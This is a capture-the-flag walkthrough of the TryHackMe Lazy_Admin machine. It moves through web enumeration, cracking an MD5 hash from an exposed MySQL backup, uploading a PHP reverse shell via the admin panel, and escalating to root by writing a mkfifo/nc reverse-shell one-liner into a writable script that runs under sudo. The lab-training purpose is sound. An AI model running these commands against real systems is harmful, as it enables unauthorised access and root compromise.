
# Lazy_Admin - TryHackMe Writeup

> **Platform:** TryHackMe  
> **Category:** Linux / Web Exploitation / Privilege Escalation  
> **Difficulty:** Beginner  

---

# Objective

Gain initial access to the target machine through exposed web application functionality, retrieve the user flag, and escalate privileges to obtain root access.

---

# Target Information

| Field | Value |
|---|---|
| Target IP | `<TARGET-IP>` |
| Attacker IP | `<ATTACKER-IP>` |

---

# Enumeration

## Nmap Scan

Started with a service and version scan:

```bash
nmap -sC -sV <TARGET-IP>
```

## Results

```text
22/tcp open  ssh
80/tcp open  http
```

### Observations

- SSH service exposed on port 22
- HTTP service exposed on port 80
- Web enumeration required

---

# Web Enumeration

Performed directory brute forcing using `ffuf`:

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt \
-u http://<TARGET-IP>/FUZZ \
-p 0.1 -c
```

## Interesting Findings

```text
/content
```

Performed another directory enumeration on `/content`:

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt \
-u http://<TARGET-IP>/content/FUZZ \
-p 0.1 -c
```

---

# Backup File Discovery

Discovered a MySQL backup file located at:

```text
http://<TARGET-IP>/content/inc/mysql_backup/
```

Downloaded and inspected the backup contents.

---

# Credential Extraction

Located a password hash inside an SQL `INSERT` query.

---

# Hash Identification

Used `hash-identifier` to determine the hash type:

```bash
hash-identifier
```

The identified hash algorithm was:

```text
MD5
```

---

# Password Cracking

Saved the hash into a file:

```text
to_crack
```

Used John The Ripper with the `rockyou.txt` wordlist:

```bash
john to_crack \
--wordlist=/usr/share/wordlists/rockyou.txt \
--format=RAW-MD5
```

Successfully recovered the plaintext password.

---

# Admin Panel Access

Used the recovered credentials to log into the admin panel:

```text
http://<TARGET-IP>/content/as/
```

---

# Initial Access

## Reverse Shell Upload

Navigated to the ads section and created a new advertisement containing a PHP reverse shell payload.

Modified the reverse shell:
- attacker IP → `<ATTACKER-IP>`
- listening port → `<PORT>`

---

# Listener Setup

Started a Netcat listener:

```bash
nc -nlvp <PORT>
```

---

# Triggering the Reverse Shell

Accessed:

```text
http://<TARGET-IP>/content/inc/ads/
```

Executed the uploaded shell file and obtained a reverse shell connection.

---

# User Flag

Retrieved the user flag:

```bash
cat user.txt
```

---

# Shell Stabilization

Upgraded the shell for better interaction:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
export TERM=xterm
```

Backgrounded the shell:

```text
CTRL + Z
```

Fixed terminal behavior:

```bash
stty raw -echo; fg
```

---

# Privilege Escalation Enumeration

Checked sudo permissions:

```bash
sudo -l
```

Observed that the user could execute a Perl script with elevated privileges.

---

# Backup Script Analysis

Viewed the Perl backup script:

```bash
cat /home/itguy/backup.pl
```

The script executed another file:

```bash
cat /etc/copy.sh
```

This file was writable and could be abused for privilege escalation.

---

# Privilege Escalation

Replaced the contents of `/etc/copy.sh` with a reverse shell payload:

```bash
echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> <PORT2> > /tmp/f" > /etc/copy.sh
```

---

# Root Listener

Started another Netcat listener:

```bash
nc -nlvp <PORT2>
```

---

# Executing the Backup Script

Executed the Perl script with sudo privileges:

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

This caused the modified `/etc/copy.sh` script to execute with elevated privileges, resulting in a root reverse shell.

---

# Root Access

Retrieved the root flag:

```bash
cat /root/root.txt
```

---

# Attack Flow Summary

1. Enumerated open services
2. Identified web application directories
3. Located exposed MySQL backup file
4. Extracted password hash
5. Identified MD5 hash type
6. Cracked password using John The Ripper
7. Logged into admin panel
8. Uploaded PHP reverse shell
9. Obtained reverse shell access
10. Stabilized shell
11. Enumerated sudo permissions
12. Identified writable script execution path
13. Injected reverse shell payload into script
14. Executed privileged Perl script
15. Obtained root shell

---

# Key Takeaways

- Exposed backup files may leak sensitive credentials
- Weak password hashing algorithms like MD5 are highly insecure
- Wordlist attacks remain effective against weak passwords
- Writable scripts executed with elevated privileges are dangerous
- Proper shell stabilization improves post-exploitation significantly
- Misconfigured sudo permissions frequently lead to privilege escalation

---

# Tools Used

- Nmap
- ffuf
- hash-identifier
- John The Ripper
- Netcat
- Python PTY
- PHP reverse shell

---

# Skills Practiced

- Service Enumeration
- Directory Brute Forcing
- Credential Extraction
- Password Cracking
- Reverse Shell Upload
- Shell Stabilization
- Linux Privilege Escalation
- Sudo Misconfiguration Exploitation

---

# References

- TryHackMe: Lazy_Admin
- John The Ripper
- Netcat
- MD5 Hash Cracking

---
